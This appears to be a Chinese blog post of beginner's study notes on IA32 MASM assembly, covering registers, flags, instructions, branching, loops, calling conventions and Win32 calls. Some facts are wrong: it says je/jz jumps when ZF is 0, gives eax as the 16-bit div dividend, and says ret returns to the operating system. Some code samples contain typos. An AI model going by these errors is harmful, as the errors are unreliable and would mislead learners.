  </entry>
  <entry>
    <title>IA32架构的MASM</title>
    <url>/2025/06/02/IA32%E6%9E%B6%E6%9E%84%E7%9A%84MASM/</url>
    <content><![CDATA[前言本博客用于复习IA32架构下微软宏汇编(MASM)的基础知识。作为初学者，本人水平有限，若内容存在疏漏或错误，恳请读者斧正
开发环境使用Visual Studio 2017 Community





程序格式.386 ;使用.386指令集.model flat,stdcall ;flat内存模式		调用子程序使用stdcallcomment/*flat:    所有段(代码段、数据段、堆栈段)都使用相同的32位地址空间    不需要使用段寄存器(CS, DS, SS等)，所有内存访问都使用32位偏移地址stdcall:	参数从右向左压入堆栈	被调用函数负责清理堆栈(与cdecl不同，cdecl是调用者清理堆栈)*/option casemap:none ;大小写敏感.const ;常量区	fm db &quot;%s&quot;ARR_LEN = 1 ;也可以这样声明常量.data ;全局变量区    x db 0 ;1bytes    y dw 0 ;字;2bytes    z dd 0 ;双字;4bytes    arr dd 50 dup(0) ;50个连续的值为零的4字节空间.code    main proc ;main程序段    _start::    main endp    end _start ;end后的部分就是程序入口，在这里,_start就是程序入口

常用寄存器EAX通用寄存器之一，存放函数的返回值
EBX，ECX，EDX寄存器布局与此类似

EBX通用寄存器之一
ECX通用寄存器之一，存放循环次数
也用于字符串操作（如 rep stosb）、移位指令（如 shl eax, cl&#96;）
EDX通用寄存器之一
ESI通用寄存器之一
在字符串&#x2F;内存操作中默认指向源数据地址
EDI在字符串&#x2F;内存操作中默认指向目标地址
ESP栈顶指针寄存器，存放栈顶的地址
PUSH会先递减 ESP，再写入数据；POP 会读取数据后递增 ESP
EBP通常用作栈帧基址（函数内通过 [EBP+offset] 访问局部变量和参数）
EIP程序计数器寄存器，存放下一条指令的地址
常用标志位CF(Carry Flag)无符号数溢出标志
add&#x2F;sub存在进位&#x2F;借位时，CF置为1
ZF(Zero Flag)运算结果为0时，置为1
SF(Sign Flag)运算结果的最高位	0:正数	1:负数
PF(Parity Flag)结果低8位的 1 的个数是否为偶数
0:奇校验
1:偶校验
OF(Overflow Flag)有符号数溢出标志
DF(Direction Flag)字符串操作方向标志
0:正向
1:反向
cld ;重置df为0

常用指令inc-自增;对全局变量自增.data ;全局变量x dd 0 ;x=0.codemain proc ;main程序段_start::	inc x ;x = 1		xor eax,eax	retmain endpend _start ;end后的部分就是程序入口，在这里,_start就是程序入口;------------------------------------------------------.data ;全局变量.codemain proc ;main程序段_start::	mov eax,0 ;eax:0x00000000	inc eax	  ;eax:0x00000001		xor eax,eax	retmain endpend _start ;end后的部分就是程序入口，在这里,_start就是程序入口



dec-自减;对全局变量自减.data ;全局变量x dd 1 ;x=1.codemain proc ;main程序段_start::	dec x ;x = 0		xor eax,eax	retmain endpend _start ;end后的部分就是程序入口，在这里,_start就是程序入口;------------------------------------------------------.data ;全局变量.codemain proc ;main程序段_start::	mov eax,1 ;eax:0x00000001	dec eax	  ;eax:0x00000000		xor eax,eax	retmain endpend _start ;end后的部分就是程序入口，在这里,_start就是程序入口

movmov dst,src;将立即数传送到寄存器mov eax,1;将寄存器中的值传送到另一寄存器;注意两个寄存器的大小要一致(8bits-&gt;8bits;16bits-&gt;16bits;32bits-&gt;32bits)mov eax,ebxmov al,ah;mov的两个操作数不能都是内存操作数(比如.data段中的数据)或立即数mov [esp+1],[esp+2] ;错误mov [esp+1],1 ;错误mov x,y ;错误

movzx-零拓展传送高位补零，无论源操作数的符号位（最高位）是 0 还是 1，高位全部填充 0
.codemain proc_start::	mov al,-1   ;eax:??????ff	movzx ax,al ;al拓展到ax eax:????00ff		movzx,eax,al ;al扩展到eax eax:000000ff	movzx eax,ax ;ax拓展到eax		xor eax,eax	retmain endpend _start

初始的al

movzx ax,al后（注意ah的变化）

movzx eax,ax后

movsx-符号拓展传送源操作数高位是1就补1,高位是0就补0
.codemain proc_start::	mov al,-1	movsx ax,al  ;al拓展到ax eax:????ffff	movsx eax,al ;al拓展到eax eax:ffffffff	movsx eax,ax ;ax拓展到eax		xor eax,eax	retmain endpend _start

初始的al

movsx ax,al后

mov ax,eax后

subsub dst,src;寄存器中的值减去立即数sub eax,1;将寄存器的值减去另一寄存器中的值sub eax,ebx;将内存中的值减去寄存器中的值sub x,ebxsub [esi+4],eax;sub的两个操作数不能都是内存操作数(比如.data段中的数据)或立即数sub [esp+1],[esp+2] ;错误sub [esp+1],1 ;错误sub x,y ;错误



addadd dst,src;将立即数加到寄存器中add eax,1;将寄存器的值加到寄存器中add eax,ebx;将寄存器中的值加到内存add x,ebxadd [esi+4],eax;add的两个操作数不能都是内存操作数(比如.data段中的数据)或立即数add [esp+1],[esp+2] ;错误add [esp+1],1 ;错误add x,y ;错误

adc-带进位的加法cf标志位:加法（ADD/ADC）：如果运算结果的最高位产生进位，CF = 1，否则 CF = 0。
减法（SUB/SBB）：如果运算需要借位（被减数 &lt; 减数），CF = 1，否则 CF = 0。
移位&#x2F;循环指令（SHL/SHR/ROL/ROR等）：存放被移出的位。
比较指令（CMP）：同减法，CMP A, B 等价于 SUB A, B（但不保存结果，只改标志位）
add sum,ebx	;sum的前4个字节adc sum+4,0 ;给sum的后四个字节加上进位 &lt;-&gt; 相当于sum+4 = sum+4+0+cf

mul-无符号数乘法隐含使用 AL&#x2F;AX&#x2F;EAX 作为被乘数
mul bl ;结果位于axmul bx ;结果:DX:AX (高16:低16)mul ebx ;结果:EDX:EAX (高32:低32)

imul-有符号数乘法单操作数与mul相同
双操作数imul dest,src

dest&#x3D;dest*src
dest只能是16位或32位寄存器，src可以是通用寄存器&#x2F;内存操作数&#x2F;立即数
三操作数imul dest,src1,src2

dest &#x3D; src1*src2
dest只能是16位或32位寄存器，src1可以是通用寄存器和内存，不能是立即数，src2只能是立即数
div-无符号整数除法div oprd

oprd可以是通用寄存器和内存操作数，但不能是立即数
8位:
被除数:ax，商：al，余数ah
16位:
被除数:eax，商：ax，余数dx
32位:
被除数:edx:eax，商：eax，余数edx
移位指令移位位数放在cl或者8位立即数
shl逻辑左移，sal算术左移这俩其实是一条机器指令，只是方便记忆变成两条
SHL r/m, imm8   ; 左移立即数位SHL r/m, CL     ; 左移CL寄存器指定的位数SAL r/m, imm8   ; 右移立即数位SAL r/m, CL     ; 右移CL寄存器指定的位数

每左移一位，右边补一位0，移出的最高位放在cf
shr逻辑右移SHR r/m, imm8   ; 右移立即数位SHR r/m, CL     ; 右移CL寄存器指定的位数

右移一位，左边补一位0，移出的最低位放在cf
sar算术右移SAR r/m, imm8   ; 右移立即数位SAR r/m, CL     ; 右移CL寄存器指定的位数

右移一位，左边符号位不变，移出的最低位放在cf
符号扩展指令CBW将al中8位有符号数扩展到ax中
若al最高位为0，ah全补0，否则全补1
.data	x1 db 0fh	y1 db 0ffhmov al,x1 ;eax:??????0fcbw ;eax:????000fmov al,y1 ;eax:??????ffcbw ;eax:????ffff

CWD将ax中16位有符号数扩展到dx:ax中
若ax最高位为0，dx全补0，否则全补1
.data	x1 dw 0000fh	y1 dw 0ffffh	mov ax,x1 ;eax:????000f	edx:????????cwd ;eax:????000f	edx:????0000mov ax,y1 ;eax:????ffff edx:????????cwd ;eax:????ffff	edx:????ffff

CDQeax扩展到eax:edx
若eax最高位为0，edx全补0，否则全补1
.data	x1 dd 00000000fh	y1 dd 0f0000000h	mov eax,x1 ;eax:00000000f	edx:????????cdq ;eax:00000000f	edx:00000000mov eax,y1 ;eax=f0000000	edx:????????cdq ;eax=f0000000	edx:ffffffff



CWDEax扩展到eax
若ax最高位为0，eax高16位全补0，否则全补1
.data	x1 dw 0000fh	y1 dw 0ffffh	mov ax,x1 ;eax:????000fcwde ;eax:0000000fmov ax,y1 ;eax:????f000cwde ;eax:fffff000

串操作指令movsb将esi指向地址的数据复制到edi指向的地址（一次1字节）
然后根据DF标志位自动递增或递减ESI和EDI：

DF&#x3D;0时：ESI和EDI递增1

DF&#x3D;1时：ESI和EDI递减1
  .data	str1 db &quot;Hello World!&quot;,00h	len dd $-str1	str2 db 00h			lea esi,str1	lea edi,str2	movsb ;str2:H;与rep结合，一次移动一块	mov ecx,len	lea esi,str1	lea edi,str2	rep movsb

movsw将esi指向地址的数据复制到edi指向的地址（1次2字节）
然后根据DF标志位自动递增或递减ESI和EDI：

DF&#x3D;0时：ESI和EDI递增1
DF&#x3D;1时：ESI和EDI递减1

movsd将esi指向地址的数据复制到edi指向的地址（1次4字节）
然后根据DF标志位自动递增或递减ESI和EDI：

DF&#x3D;0时：ESI和EDI递增1
DF&#x3D;1时：ESI和EDI递减1

stosb需要配合rep来实现对一块连续内存进行串填充，填充次数存放在ecx寄存器中，填充值放在al/ax/eax中,填充到edi指向的地址(涉及目的地 ，使用edi)
字符串操作方向由df标志位实现(正向:df&#x3D;0	反向:df&#x3D;1)
rep stosb/stosw之前应使用cld指令先重置df
stoswstosdlea取地址并传送
.data	arr db 50 dub(0).codemain proc	lea esi,arr ;取arr的首地址传送到esi中main endpend main

等价于
.data	arr db 50 dub(0).codemain proc	mov esi,offset arr ;取arr的首地址传送到esi中 offset:通用偏移地址获取main endpend main



xchg交换内存&#x2F;寄存器的值
xchg op1,op2;op1和op2中至少有一个是寄存器操作数

andand dest,src

dest &#x3D; dest &amp; src
oror dest,src

dest &#x3D; dest | src
xorxor dest,src

dest &#x3D; dest xor src
test与and类似，但是不送到dest中,仅影响标志位
test dest,src



转移指令jmp无条件转移
转移到标签
test1:	mov eax,offset test1	jmp test1

寄存器间接转移
test1:	mov eax,offset test1	jmp eax ;转移到eax中的地址

je&#x2F;jz当zf&#x3D;0时转移
.codemain proc_start::test1:	mov eax,1	mov ebx,1	cmp eax,ebx	jz test1 ;此时相当于死循环	写成je也是相同的效果	xor eax,eax	retmain endpend _start

ja&#x2F;jnbe无符号数比较，高于(不低于等于)时转移(cf&#x3D;0且zf&#x3D;0)
.codemain proc_start::test1:	mov eax,1	mov ebx,4	cmp ebx,eax	ja test1 ;跳转到test1	jmp end_ifend_if:	xor eax,eax	retmain endpend _start;------------------------.codemain proc_start::test1:	mov eax,1	mov ebx,4	cmp eax,ebx	ja test1	jmp end_if ;跳转到程序结束end_if:	xor eax,eax	retmain endpend _start

jb&#x2F;jnae无符号数比较,低于(不高于等于)时转移
.codemain proc_start::test1:	mov eax,1	mov ebx,4	cmp ebx,eax	jb test1	jmp end_if ;跳转到程序结束end_if:	xor eax,eax	retmain endpend _start;------------------------.codemain proc_start::test1:	mov eax,1	mov ebx,4	cmp eax,ebx	jb test1 ;跳转到test1	jmp end_ifend_if:	xor eax,eax	retmain endpend _start

jo溢出转移(OF&#x3D;1)
.datac1 dd 07fffffffh ;int_max.codemain proc_start::test1:	mov eax,1	mov ebx,4	add eax,c1	jo test1	jmp end_ifend_if:	xor eax,eax	retmain endpend _start

jno不溢出转移(OF&#x3D;0)
js为负转移(sf&#x3D;1)
.codemain proc_start::test1:	mov eax,1	mov ebx,4	add eax,c1 ;0xffffffff = -1 为负	js test1 ;转移到test1	jmp end_ifend_if:	xor eax,eax	retmain endpend _start



jns为正转移(sf&#x3D;0)
.codemain proc_start::test1:	mov eax,1	mov ebx,4	add ebx,c1 ;2=0x00000010	jns test1 ;转移到test1	jmp end_ifend_if:	xor eax,eax	retmain endpend _start



jg&#x2F;jnle有符号数比较,大于&#x2F;不小于等于时转移
.codemain proc_start::test1:	mov eax,-1	mov ebx,-4	cmp eax,ebx	jg test1 ;-1 &gt; -4 转移	jmp end_ifend_if:	xor eax,eax	retmain endpend _start

jl&#x2F;jnge有符号数比较，小于&#x2F;不大于等于时转移
.codemain proc_start::test1:	mov eax,-1	mov ebx,-4	cmp ebx,eax	jl test1 ;-4 &lt; -1 转移	jmp end_ifend_if:	xor eax,eax	retmain endpend _start

jcxzcx&#x3D;0时转移
jecxzecx&#x3D;0时转移
寻址方式寄存器寻址add eax,ebx

基址寻址常用于堆栈
push ebpmov ebp,espmov eax,[ebp+4] ;基址寻址

立即数寻址mov eax,064h ;常量操作

变址寻址mov eax,[esi+10h] ;数组操作

相对寻址adc sum+4,0 ;数组操作

寄存器间接寻址访问指针指向的变量
add dword ptr [ebx],ecx

顺序程序设计eg:有三个长度分别为1、2、4个字节的数据，编写程序求和存放到内存中
程序1三个数据均为无符号数，求和的结果考虑进位的存储
.data ;全局变量a db 1b dw 2c1 dd 0ffffffffh	;无符号数sum dd 0,0	;因为要考虑进位存储,需要额外再开4字节空间.codemain proc_start::	movzx ax,a	;a零拓展到ax	add ax,b	;b加到ax中		movzx eax,ax	;ax拓展到eax中	add eax,c1	;发生溢出，CF标志位被置为1	mov sum,eax	adc sum+4,0	;进位传送到高4字节 相当于sum+4 = sum+4+0+CF		xor eax,eax	retmain endpend _start

程序2三个数据均为有符号数，求和的结果不考虑进位的存储（进位直接丢掉）
.data ;全局变量a db 1b dw 2c1 dd 0ffffffffh	;int：-1 uint:最大值sum dd 0.codemain proc_start::	movsx ax,a	;a有符号拓展到ax	add ax,b	;b加到ax中		movsx eax,ax	;ax有符号拓展到eax中	add eax,c1	;2		xor eax,eax	retmain endpend _start

思考1.用户如何自定义超过系统事先定义好的数据类型的长度?(比如在C语言中实现128位整数)
使用连续的等长内存空间来分段存储，根据地址偏移进行分段运算和进位传递
_int64 arr[2]; //arr[0]:低64位	arr[1]:高64位_int32 arr[4]; 

2.不同寻址方式对编写程序的作用
作用:不同的寻址方式有不同的程序执行效率，程序可读性与可维护性
简单分支程序设计汇编中是通过条件&#x2F;无条件转移指令实现简单的分支程序(if-else结构)
程序1实现逻辑或的逻辑短路
对应的c语言代码
#include &lt;stdio.h&gt;int main()&#123;        int a=5,b=6,c=7,d=8,m=2,n=2;        (m=a&lt;b)||(n=c&gt;d);        printf(&quot;%d\t%d&quot;,m,n);&#125;



.data	a dd 5	b dd 6	c1 dd 7	d dd 8	m dd 2	n dd 2.codemain proc_start::	mov eax,a	cmp eax,b	jl alb ;a小于b，exp1 || exp2中的exp1为true，短路	mov eax,0	mov m,eax	mov eax,c1	cmp eax,d	jle cleb ;给n赋值0	mov eax,1	mov n,eax ;给n赋值1	jmp end_proc alb: ;a小于b，exp1 || exp2中的exp1为true，短路	mov eax,1	mov m,eax	jmp end_proccleb:	mov eax,0	mov n,eax	jmp end_proc	end_proc:	xor eax,eax	retmain endpend _start



程序2实现逻辑与的逻辑短路
对应的c语言代码
#include &lt;stdio.h&gt;int main()&#123;        int a=5,b=6,c=7,d=8,m=2,n=2;        (m=a&lt;b)&amp;&amp;(n=c&gt;d);        printf(&quot;%d\t%d&quot;,m,n);&#125;



.data	a dd 5	b dd 6	c1 dd 7	d dd 8	m dd 2	n dd 2.codemain proc_start::	mov eax,a	cmp eax,b	jge ageb ;大于等于，第一个表达式为假，短路	mov eax,1	mov m,eax	mov eax,c1	cmp eax,d	jle cleb ;小于等于，第2个表达式为假	mov eax,1	mov n,eax	jmp end_proc ageb:	mov eax,0	mov m,eax ;给m赋值为0	jmp end_proccleb:	mov eax,0	mov n,eax	jmp end_proc	end_proc:	xor eax,eax	retmain endpend _start

思考1.简述分支语句的实现原理（注意标志位在其中的作用）
根据标志位值的变化和相应的跳转指令
2.简述逻辑运算短路的特征
逻辑或: exp1 || exp2
当exp1结果为真时，整体就为真，不再执行exp2就直接跳转到对应分支
逻辑与 exp1 &amp;&amp; exp2
当exp1结果为假时，整体就为假，不再执行exp2就直接跳转到对应分支
地址表分支程序设计在简单分支程序中，有太多的标签与各种各样的跳转指令，分支的不可预测性强，这样会破坏流水线技术

但是在地址表分支程序中，所有分支的地址都位于一个地址表中，其实只需要根据间接寻址，使用一条jmp指令就能转移到对应分支
原C程序
#include &lt;stdio.h&gt;int main()&#123;        int grade = 90;        switch (grade / 10)        &#123;        case 9:                printf(&quot;excellence&quot;);                break;        case 8:                printf(&quot;good&quot;);                break;        case 7:                printf(&quot;average&quot;);                break;        case 6:                printf(&quot;pass&quot;);                break;        default:                printf(&quot;fail&quot;);        &#125;        return 0;&#125;

汇编实现
.data	grade dd 90	adr_table dd offset case6,offset case7,offset case8,offset case9.codemain proc_start::	xor edx,edx	mov eax,grade	mov bx,10	div bx	sub eax,6 ;获取和6的差值,即后面的偏移量	cmp eax,0	jl default ;低于60	mov eax,[adr_table+eax*4] ;根据偏移量找到对应分支的地址，解引用后传送到eax中	jmp eax ;转移到对应分支case6::	mov eax,6case7::	mov eax,7case8::	mov eax,8case9::	mov eax,9default:end_proc:	xor eax,eax	retmain endpend _start

思考1.采用地址表和不采用地址表有什么区别
地址表是一种空间换时间的算法，时间复杂度为O(1)，但是空间复杂度达到了O(n)
通过连续内存来存储分支的地址，减少了程序中各种转移指令的使用，不仅使程序可读性更强，同时分支可预测，在分支之间转移的时间少，利于流水线模式
区别:
采用地址表:程序可读性更强，直接使用地址偏移量跳转，更加高效;但是空间开销较高，比较适合条件连续的分支
不采用地址表:程序可读性没那么好，容易逻辑混乱。但是空间开销较小
2.如果分支常量值不连续，还可以使用地址表吗
可以，没有值的地方填充0或者指定值(空间换时间)
循环程序设计eg:
编写程序实现C语言函数void *memset(void* s,int ch,size_t n)，将指定的内存中连续N个字节填写成指定的内容，要求：

每次填写一个字节

每次填写一个字

分别用LOOP指令、串操作指令、条件（无条件）转移指令分别实现以上的操作


loop指令实现循环次数由ecx寄存器决定
1.每次填写一个字节
定义数据
fill_var = 03ch ;将填充值定义为常量.data	arr db 10 dup(0) ;n dup(x) 给连续n个空间赋值x    arr_len dd $-arr ;$表示当前地址,$-arr表示填充的字节数有多少

实现
.codemain proc_start::	mov al,fill_var ;一次写入一个字节，填充值传送到al中	mov ecx,arr_len ;循环次数传送到ecx中	lea esi,arr ;取arr的首地址传送到esi中memset:	mov [esi],al ;将填充值传送到esi指向的地址,完成一字节的填充	inc esi ;指针向后移一个字节	loop memset ;循环	xor eax,eax	retmain endpend _start

2.每次填写一个字
定义数据
fill_var = 03ch ;填充值.data	arr dw 10 dup(0) ;字数组	arr_len dd ($-arr)/2 ;填充字数

实现
.codemain proc_start::	mov ax,fill_var	mov ecx,arr_len	lea esi,arrmemset:	mov [esi],ax	add esi,2 ;因为一次写入一个字（2个字节），这里地址要加2	loop memset	xor eax,eax	retmain endpend _start



串操作指令实现需要配合rep来实现对一块连续内存进行串填充，填充次数存放在ecx寄存器中，填充值放在al/ax/eax中,填充到edi指向的地址(涉及目的地 ，使用edi)
字符串操作方向由df标志位实现(正向:df&#x3D;0	反向:df&#x3D;1)
rep stosb/stosw之前应使用cld指令先重置df
stosb将al中的值写入[edi]中，即一次写入一个字节
定义数据
fill_var = 03ch ;填充值.data	arr db 10 dup(0) ;字节数组	arr_len dd ($-arr) ;填充字节数

实现
.codemain proc_start::	mov al,fill_var	mov ecx,arr_len ;重复次数	lea edi,arr ;操作的首地址一定要放在edi中	cld ;清空df位	rep stosb	xor eax,eax	retmain endpend _start

stosw将ax中的值写入[edi]中，即一次写入一个字(2字节)
定义数据
fill_var = 03ch ;填充值.data	arr dw 10 dup(0) ;字数组	arr_len dd ($-arr)/2 ;填充字数

实现
.codemain proc_start::	mov ax,fill_var	mov ecx,arr_len	lea edi,arr	cld	rep stosw	xor eax,eax	retmain endpend _start



条件&#x2F;无条件转移指令实现类似与C语言中的
for(int i = len;i&gt;=0;--i)&#123;    /*code*/&#125;

一次写入一个字节
定义数据
fill_var = 03ch ;填充值.data	arr db 10 dup(0) ;字节数组	arr_len dd ($-arr) ;填充字节数

实现
.codemain proc_start::	mov al,fill_var	mov ecx,arr_len	lea esi,arrmemset:	cmp ecx,0	jle end_loop	dec ecx	mov [esi],al	inc esi	jmp memsetend_loop:	xor eax,eax	retmain endpend _start

一次写入一个字
定义数据
fill_var = 03ch ;填充值.data	arr dw 10 dup(0) ;字数组	arr_len dd ($-arr)/2 ;填充字数

实现
.codemain proc_start::	mov ax,fill_var	mov ecx,arr_len	lea esi,arrmemset:	cmp ecx,0	jle end_loop	dec ecx	mov [esi],al	add esi,2	jmp memsetend_loop:	xor eax,eax	retmain endpend _start

实现冒泡排序C语言实现:
int k = n - 1;for (int i = 0; i &lt; n; ++i)&#123;    for (int j = 0; j &lt; k; ++j)    &#123;        if (arr[j] &gt; arr[j + 1])        &#123;            int tmp = arr[j];            arr[j] = arr[j + 1];            arr[j + 1] = tmp;        &#125;    &#125;    k--;&#125;

关键点:
内外两层循环，内循环次数比外循环少一次
内循环中有一个临时变量用于交换值
汇编实现
fill_var = 03ch ;填充值.data	arr db 10,9,8,7,6,5,4,3,2,1 ;字节数组	arr_len dd ($-arr) ;填充字节数.codemain proc_start::	lea esi,arr	mov ecx,arr_lenouter:	cmp ecx,0	jbe end_loop	push ecx ;内循环也需要ecx作为循环次数,因此需要压入堆栈保护起来	push esi ;esi指向首地址，但是内循环中需要esi向后移动，为了防止找不到首地址，也需要将esi压入堆栈保护inner:	mov bl,[esi] ;用寄存器模拟临时变量	mov dl,[esi+1] ;用寄存器模拟临时变量	cmp bl,dl ;if (arr[j] &gt; arr[j + 1])	ja swap	jmp no_swapswap:	mov [esi],dl	mov [esi+1],bl	no_swap:	inc esi ;指向下一字节	loop inner	pop esi	pop ecx ;平衡堆栈	loop outerend_loop:	xor eax,eax	retmain endpend _start

初始数组:

排序后:

思考loop指令和串操作指令的性能对比，必须通过循环实现的程序如何提高性能?
​	使用串操作指令的性能优于loop指令
​	提高性能:
​		1.使用更宽的数据进行操作，减少循环次数
​		2.确保内存对齐
​		3.避免使用loop，使用更高效的指令(比如串操作指令)
循环程序和分支程序的关系?
​	循环程序和分支程序都依赖于条件判断和跳转指令，不同的是，循环程序是反复多次跳转，而分支程序跳转后变不再反复跳转回来
LOOP的双重循环例子，理解系统如何存储临时变量?
​	将ecx压入堆栈中进行保护，防止内层循环改变ecx的值导致外层循环的结果错误
高级语言中break和continue的实现?
​	continue:跳转到当前循环的标签
​	break:跳转到循环外的另一个标签
子程序设计格式子程序名 proc	push ebp ;栈帧基址	mov ebp,esp		pop ebp ;平衡堆栈	ret子程序名 endp

调用call 子程序名add esp,8 ;例子

call指令会将下一条指令(在这里就是add esp,8)的地址压入堆栈中(称为返回地址，子程序ret后就会返回到这个位置)，进入子程序后，堆栈内部情况如下

重点能判断出堆栈的状态，可以用excel画当前堆栈示意图
调用约定stdcall参数从右至左压入堆栈，子程序(被调函数)负责平衡堆栈
int addxy(int x,int y);

在汇编中传入参数
.codeaddxy proc	push ebp	mov ebp,esp	mov eax,[ebp+8]	add eax,[ebp+12]	pop ebp	ret 8addxy endpmain proc_start::	push ebp	mov ebp,esp	push y ;先压y	push x ;再压x	call addxy	xor eax,eax	pop ebp	retmain endpend _start



cdecl参数从右至左压入堆栈，调用者负责平衡堆栈
.codeaddxy proc	push ebp	mov ebp,esp	mov eax,[ebp+8]	add eax,[ebp+12]	pop ebp	retaddxy endpmain proc_start::	push ebp	mov ebp,esp	push y ;先压y	push x ;再压x	call addxy		add esp,8 ;平衡堆栈	xor eax,eax	pop ebp	retmain endpend _start

fastcall前两个参数用 ECX&#x2F;EDX，子程序(被调函数)负责平衡堆栈
例题eg:编写汇编语言子程序，实现C表达式SUM&#x3D;X+Y的功能

函数的参数传递采用寄存器实现

.data	x1 dd 5	y1 dd 6.codeaddxy proc	push ebp	mov ebp,esp	add eax,ebx	pop ebp	retaddxy endpmain proc_start::	push ebp	mov ebp,esp	mov eax,x1	mov ebx,y1	call addxy	xor eax,eax	pop ebp	retmain endpend _start


函数的参数传递采用堆栈实现，要求函数的形式为int addxy(int ,int)[传值调用]

C语言函数声明
int addxy(int x,int y);

汇编实现
压栈顺序为 y -&gt; x
堆栈示意图

.data	x1 dd 5	y1 dd 6.codeaddxy proc	push ebp	mov ebp,esp	mov eax,[ebp+8]	add eax,[ebp+12]	pop ebp	ret 8addxy endpmain proc_start::	push ebp	mov ebp,esp	push y1	push x1	call addxy	xor eax,eax	pop ebp	retmain endpend _start




函数的参数传递采用堆栈实现，要求函数的形式为void addxy(int ,int,int*)[传址调用]

C语言函数声明
void addxy(int x,int y,int* sum);

汇编实现
压栈顺序: int* sum -&gt; y -&gt; x
堆栈示意图：

.data	x1 dd 5	y1 dd 6	sum dd 0.codeaddxy proc	push ebp	mov ebp,esp	mov eax,[ebp+8]	add eax,[ebp+12]	mov [esi],eax ;*sum = x+y	pop ebp	ret 12addxy endpmain proc_start::	push ebp	mov ebp,esp	lea esi,sum	push esi	push y1	push x1	call addxy	xor eax,eax	pop ebp	retmain endpend _start


结构体传参

在汇编中定义结构体
结构体名 struct	x1 dd ?	y1 dd ?	sum dd ?结构体名 ends.data	变量名 结构体名 &lt;1,2,0&gt; ;&#123;x1=1,y1=2,sum=0&#125;

传参时,应该是传址调用，因此我们需要传入结构体变量的地址
dataseg struct	x1 dd ?	y1 dd ?	sum dd ?dataseg ends.data	data dataseg &lt;5,6,0&gt;.codeaddxy proc	push ebp	mov ebp,esp	mov eax,[esi] ;(&amp;data)-&gt;x传送到eax	add eax,[esi+4] ;(&amp;data)-&gt;y加到eax	mov [esi+8],eax ;eax中的值传送到(&amp;data)-&gt;sum	pop ebp	ret 4 ;平衡堆栈addxy endpmain proc_start::	push ebp	mov ebp,esp	lea esi,data ;&amp;data	push esi	call addxy	xor eax,eax	pop ebp	retmain endpend _start

5)改正下面程序的问题
;调用程序…Mov bx,10Mov cx,20Call funAdd bx,cxAdd ax,bx…;被调用程序Fun proc    Xor ax,ax    Mov cx,5    Mov bx,1    Shl bx,cx    RetFun endp

1.bx,cx寄存器在调用程序段和被调用程序段都被使用，却没有压进堆栈中进行保护，导致子程序段中破坏了它们
2.左移位指令shl使用错误，移位次数应该放在cl中而不是cx
3.子程序的结果并没有存到ax中，导致子程序的结果丢失，ax中的值始终是0
思考1.标准C函数参数结合顺序从右至左是什么意思
​	答:参数压入堆栈的顺序从右至左
2.栈在程序中的作用
​	答:保护寄存器，存储临时变量，传递参数
3.从机器执行的角度理解标准C中传值和传地址是什么意思
​	答: 传值:压入堆栈的是原变量的副本，在堆栈中不会影响原变量的值，影响的只是原变量的副本
​	    传址:压入堆栈的是原变量的地址，在堆栈中可以改变地址指向的值从而影响原变量
4.系统调用是指什么，怎么实现的
​	答:程序调用操作系统提供的函数，通过引用操作系统提供的动态库(.lib)
5.为什么函数只能返回一个值
​	答:函数返回值通过eax寄存器，但是eax寄存器只有一个
6.函数调用时如何转到被调用的函数，又是如何返回的
​	答:call指令相当于两条指令:
​		1.将call指令的下一条指令地址压入堆栈作为返回地址
​		2.jmp 子程序
7.函数的入口地址是什么概念，为什么C语言可以通过指向函数的指针调用函数
​	答:函数首条指令的地址；函数指针中存放的是函数首条指令的地址，而汇编中调用函数就相当于 call [函数首地址]
8.编写子程序时为什么要注意寄存器的保护
​	答:在子程序中使用寄存器，要先压入堆栈进行保护，使用完毕后再弹出，这是因为，子程序中直接使用寄存器会破坏其中的值，特别是这个寄存器如果在调	用者中还要再次使用，如果值被破坏，那么程序最后的执行结果就会出错
9.Call指令和RET的指令的作用是什么，RET后面跟的常数是什么意思，为什么要在后面跟常数？
​	答:
​		call指令:调用子程序同时将调用程序的下一条指令地址压入堆栈
​		ret指令:程序段执行完毕，返回操作系统
​		常数:告诉操作系统平衡堆栈需要几个字节
​		为什么:需要平衡堆栈，避免堆栈不平衡导致栈溢出
系统调用在vs2017中，因为我们创建的项目是C++空项目，所以项目属性中已经帮我们引用了对应的系统调用的库

声明函数声明或者调用的时候应当注意参数通常声明为DWORD的数据就可以了，但是要注意，如果在C|C++中声明的是指针，调用的时候需要加上ADDR&#x2F;offset
以ReadFile为例
BOOL ReadFile(  HANDLE       hFile,          // 文件/设备的句柄  LPVOID       lpBuffer,       // 接收数据的缓冲区指针  DWORD        nNumberOfBytesToRead, // 要读取的字节数  LPDWORD      lpNumberOfBytesRead,  // 实际读取的字节数（输出参数）  LPOVERLAPPED lpOverlapped    // 用于异步操作的 OVERLAPPED 结构指针（可选）);

在汇编中声明
ReadFile proto  	hFile:dword,    lpBuf:dword,    notr:dword,    lobr:dword,    lol:dword

为什么使用proto呢？
使用proto声明就可以忽略函数的修饰名
如果使用extrn
EXTRN	__imp__ReadFile@20:PROC

函数名太繁琐
调用函数使用invoke(更方便)invoke WriteFile,_hout$[ebp],offset msg,msg_len,addr _cWritten$[ebp],00h



使用callpush 00h                    ; lpOverlapped (最后一个参数先压栈)lea eax, _cWritten$[ebp]    ; lpNumberOfBytesWritten 的地址push eaxmovsx eax,msg_len              ; nNumberOfBytesToWrite（若msg_len是变量，需用 offset）push eaxlea eax, msg                ; lpBufferpush eaxpush _hout$[ebp]            ; hFilecall WriteFile

使用call更加麻烦，需要自己将参数压入堆栈(但是不用手动平衡堆栈)
例题将下面的C语言代码改写成汇编
#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;HANDLE hStdout, hStdin;int main(void)&#123;	LPSTR lpszPrompt1 = &quot;Type a line and press Enter, or q to quit: &quot;;	CHAR chBuffer[256];	DWORD cRead, cWritten;	// Get handles to STDIN and STDOUT.	hStdin = GetStdHandle(STD_INPUT_HANDLE);	hStdout = GetStdHandle(STD_OUTPUT_HANDLE);	if (hStdin == INVALID_HANDLE_VALUE ||		hStdout == INVALID_HANDLE_VALUE)	&#123;		return 1;	&#125;	// Write to STDOUT and read from STDIN by using the default	// modes. Input is echoed automatically, and ReadFile	// does not return until a carriage return is typed.	//	// The default input modes are line, processed, and echo.	// The default output modes are processed and wrap at EOL.	while (1)	&#123;		if (!WriteFile(			hStdout,               // output handle			lpszPrompt1,           // prompt string			lstrlenA(lpszPrompt1), // string length			&amp;cWritten,             // bytes written			NULL))                // not overlapped		&#123;						return 1;		&#125;		if (!ReadFile(			hStdin,    // input handle			chBuffer,  // buffer to read into			255,       // size of buffer			&amp;cRead,    // actual bytes read			NULL))    // not overlapped			break;		if (chBuffer[0] == &#x27;q&#x27;) break;	&#125;	return 0;&#125;

